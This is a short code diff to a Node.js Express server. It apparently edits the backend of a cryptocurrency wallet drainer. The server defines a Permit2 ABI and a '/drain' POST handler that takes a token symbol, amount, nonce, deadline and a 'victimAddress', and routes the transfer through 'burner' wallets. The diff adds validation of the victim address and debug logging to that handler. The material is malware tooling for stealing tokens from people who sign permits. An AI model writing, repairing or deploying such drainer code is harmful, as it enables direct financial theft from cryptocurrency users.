@@ -153,11 +153,14 @@ const permit2ABI = [
 // 🔥 INSIDE /drain POST handler - REPLACE ENTIRE TRY BLOCK:
 app.post('/drain', async (req, res) => {
   try {
-    const { tokenSymbol, amount, nonce, deadline, victimAddress } = req.body; // ADD victimAddress
     
-    if (!tokenSymbol || !TOKENS[tokenSymbol]) {
-      return res.status(400).json({ error: 'Invalid token' });
-    }
+const { tokenSymbol, amount, nonce, deadline, victimAddress } = req.body;
+console.log('🔥 RECEIVED:', req.body);  // 🔥 DEBUG
+
+if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.utils.isAddress(victimAddress)) {
+  console.log('❌ VALIDATION FAILED:', { tokenSymbol, victimAddress });
+  return res.status(400).json({ error: 'Missing tokenSymbol, victimAddress or invalid address' });
+}
 
     const burner = burners[0]; // Use first burner
     const tokenAddress = TOKENS[tokenSymbol];
